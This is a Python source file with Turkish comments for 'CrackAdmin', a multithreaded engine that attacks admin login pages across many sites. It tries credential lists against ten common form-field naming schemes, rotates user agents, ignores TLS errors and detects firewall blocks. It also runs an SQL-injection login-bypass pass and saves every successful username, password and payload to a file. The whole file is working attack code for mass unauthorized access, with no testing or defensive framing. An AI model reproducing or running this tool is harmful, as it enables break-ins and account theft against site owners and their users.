"""
CrackAdmin - Cracker Engine
Paralel şifre deneme motoru - YALNIZCA başarılı girişleri göster
"""

import requests, threading, time, queue, re
from urllib.parse import urljoin
from datetime import datetime
from typing import List, Tuple, Optional, Callable
from pathlib import Path
import urllib3
urllib3.disable_warnings()

from config import (
    SUCCESS_FILE, OLDSITE_FILE,
    MAX_THREADS, REQ_TIMEOUT, RETRY_COUNT, DELAY_BASE,
    FW_CODES, FW_PATTERNS, SUCCESS_TOKENS, FAIL_TOKENS
)

# Farklı login form parametre isimleri
PARAM_SETS = [
    {"username": "{u}", "password": "{p}"},
    {"user":     "{u}", "pass":     "{p}"},
    {"email":    "{u}", "password": "{p}"},
    {"login":    "{u}", "password": "{p}"},
    {"admin":    "{u}", "passwd":   "{p}"},
    {"name":     "{u}", "pwd":      "{p}"},
    {"usr":      "{u}", "psw":      "{p}"},
    {"uname":    "{u}", "upass":    "{p}"},
    {"j_username":"{u}","j_password":"{p}"},
    {"log":      "{u}", "pwd":      "{p}"},
]

def _fill(params: dict, u: str, p: str) -> dict:
    return {k: v.replace("{u}", u).replace("{p}", p) for k, v in params.items()}

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

class LoginTester:
    """Tek bir URL için login deneme motoru"""

    def __init__(self, ua_idx: int = 0):
        self.sess    = requests.Session()
        self._ua_idx = ua_idx
        self.sess.headers.update({
            "User-Agent": UA_POOL[ua_idx % len(UA_POOL)],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        self.sess.max_redirects = 5

    def _is_firewall(self, r: requests.Response) -> bool:
        if r.status_code in FW_CODES:
            return True
        body = r.text.lower()
        return any(p in body for p in FW_PATTERNS)

    def _is_success(self, r: requests.Response, original_url: str) -> bool:
        """Başarılı login kontrolü"""
        if r.status_code in (401, 403):
            return False
        body = r.text.lower()

        # Başarı tokenleri
        success_hits = sum(1 for t in SUCCESS_TOKENS if t in body)
        fail_hits    = sum(1 for t in FAIL_TOKENS    if t in body)

        # URL değişimi (redirect = başarılı login genellikle)
        url_changed = (r.url.rstrip("/") != original_url.rstrip("/"))

        if success_hits >= 2 and fail_hits == 0:
            return True
        if url_changed and "dashboard" in r.url.lower():
            return True
        if url_changed and "logout" in body:
            return True
        return False

    def try_login(self, login_url: str, username: str, password: str) -> bool:
        """Bir (user, pass) ikilisini dene, True = başarılı"""
        for params_tmpl in PARAM_SETS:
            data = _fill(params_tmpl, username, password)
            try:
                r = self.sess.post(
                    login_url, data=data,
                    timeout=REQ_TIMEOUT,
                    verify=False,
                    allow_redirects=True,
                )
                if self._is_firewall(r):
                    return False
                if self._is_success(r, login_url):
                    return True
            except (requests.Timeout, requests.ConnectionError):
                pass
            except Exception:
                pass
        return False

    def try_sqli(self, login_url: str, payloads: List[str]) -> Optional[Tuple[str,str]]:
        """SQL injection dene, başarılı payload'u döner"""
        sqli_params = [
            {"username": "{p}", "password": "{p}"},
            {"user": "{p}", "pass": "{p}"},
            {"email": "{p}", "password": "anything"},
        ]
        for payload in payloads:
            for tmpl in sqli_params:
                data = _fill(tmpl, payload, payload)
                try:
                    r = self.sess.post(login_url, data=data,
                                       timeout=REQ_TIMEOUT, verify=False,
                                       allow_redirects=True)
                    if self._is_success(r, login_url):
                        return ("SQLi", payload)
                except Exception:
                    pass
        return None


class ParallelCracker:
    """
    Çoklu site / credential paralel kırma
    Sadece başarılı sonuçları göster (ekran gürültüsü yok)
    """

    def __init__(self, tui=None, max_threads: int = MAX_THREADS):
        self._tui      = tui
        self._max_thr  = max_threads
        self._results  = []          # başarılı giriş kayıtları
        self._lock     = threading.Lock()
        self._stop_evt = threading.Event()
        self._q        = queue.Queue()
        self._active   = 0

    # ── Loglama ──────────────────────────────────────────────────────────────
    def _log(self, text, kind="info"):
        if not self._tui:
            return
        if kind == "ok":
            self._tui.ok(text)
        elif kind == "stream":
            self._tui.stream(text)
        elif kind == "warn":
            self._tui.warn(text)
        elif kind == "sys":
            self._tui.sys(text)

    # ── Sonuç kaydet ─────────────────────────────────────────────────────────
    def _save_success(self, url: str, username: str, password: str, method: str = ""):
        entry = {
            "url": url, "username": username,
            "password": password, "method": method,
            "ts": datetime.now().isoformat()
        }
        with self._lock:
            self._results.append(entry)
        # Dosyaya yaz
        with open(SUCCESS_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"URL      : {url}\n")
            f.write(f"Kullanıcı: {username}\n")
            f.write(f"Şifre    : {password}\n")
            if method:
                f.write(f"Yöntem   : {method}\n")
            f.write(f"Zaman    : {entry['ts']}\n")

    # ── Worker ───────────────────────────────────────────────────────────────
    def _worker(self, worker_id: int, payloads: List[str]):
        tester = LoginTester(ua_idx=worker_id)

        while not self._stop_evt.is_set():
            try:
                item = self._q.get(timeout=1)
            except queue.Empty:
                continue

            if item is None:
                self._q.task_done()
                break

            site_url, login_url, username, password = item

            # Canlı stream - sadece hangi sitenin deneniyor (şifreyi gösterme)
            self._log(f"[{worker_id:02d}] {site_url} — {username}", "stream")

            # Normal login
            if tester.try_login(login_url, username, password):
                self._log(
                    f"GİRİŞ BAŞARILI  {login_url}  {username}:{password}",
                    "ok"
                )
                self._save_success(login_url, username, password)
                if self._tui:
                    self._tui.update_stats(hits=len(self._results))
            # İstatistik
            if self._tui:
                with self._lock:
                    pass
                self._tui.update_stats(attempts=self._tui._stats.get("attempts",0)+1)

            time.sleep(DELAY_BASE)
            self._q.task_done()

    # ── SQL injection pass ───────────────────────────────────────────────────
    def _sqli_worker(self, sites: List[Tuple[str,str]], payloads: List[str]):
        """Her site için SQL injection dene"""
        tester = LoginTester()
        for site_url, login_url in sites:
            if self._stop_evt.is_set():
                break
            self._log(f"SQLi → {site_url}", "stream")
            result = tester.try_sqli(login_url, payloads[:30])
            if result:
                user, payload = result
                self._log(f"SQLi BAŞARILI  {login_url}  payload:{payload}", "ok")
                self._save_success(login_url, user, payload, method="SQLi")
                if self._tui:
                    self._tui.update_stats(hits=len(self._results))

    # ── Ana crack fonksiyonu ─────────────────────────────────────────────────
    def crack(self,
              sites:       List[str],
              credentials: List[Tuple[str,str]],
              payloads:    List[str],
              max_threads: int = None) -> List[dict]:
        """
        sites       : admin login URL'leri
        credentials : [(user, pass), ...]
        payloads    : SQL injection payloadları
        """
        if not sites:
            return []

        threads = min(max_threads or self._max_thr, MAX_THREADS, len(sites) * 2)
        self._stop_evt.clear()
        self._results = []
        self._q       = queue.Queue()

        if self._tui:
            self._tui.update_stats(sites=len(sites), attempts=0, hits=0)

        # Önce SQLi dene (hızlı)
        self._log("SQL Injection taraması başlıyor...", "sys")
        site_pairs = []
        for u in sites:
            site_pairs.append((u.split("/admin")[0] if "/admin" in u else u, u))
        sqli_t = threading.Thread(
            target=self._sqli_worker,
            args=(site_pairs, payloads),
            daemon=True
        )
        sqli_t.start()
        sqli_t.join(timeout=60)

        # Credential doldurmak için queue
        self._log(f"Credential taraması: {len(sites)} site × {len(credentials)} şifre", "sys")
        for login_url in sites:
            base = login_url.split("/admin")[0] if "/admin" in login_url else login_url
            for username, password in credentials:
                self._q.put((base, login_url, username, password))

        # Poison pills
        for _ in range(threads):
            self._q.put(None)

        # Thread'leri başlat
        workers = []
        for i in range(threads):
            t = threading.Thread(
                target=self._worker,
                args=(i, payloads),
                daemon=True
            )
            t.start()
            workers.append(t)

        self._q.join()
        for t in workers:
            t.join(timeout=2)

        return self._results

    def stop(self):
        self._stop_evt.set()

    def get_results(self) -> List[dict]:
        return list(self._results)
